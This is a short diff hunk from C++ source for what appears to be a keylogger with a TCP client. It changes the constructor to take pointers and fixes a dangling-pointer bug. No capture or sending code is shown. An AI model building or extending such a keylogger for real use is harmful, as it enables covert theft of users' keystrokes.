@@ -23,10 +23,10 @@ const std::vector<std::vector<BYTE>> Keylogger::keySets = { valueKeys, specialKe
 
 BYTE Keylogger::keyState[256] = { 0 };
 
-Keylogger::Keylogger(TcpClient client, Filters filters)
+Keylogger::Keylogger(TcpClient *client, Filters *filters)
 {
-	this->client = &client;
-	this->filters = &filters;
+	this->client = client;
+	this->filters = filters;
 }
 
 Keylogger::~Keylogger()
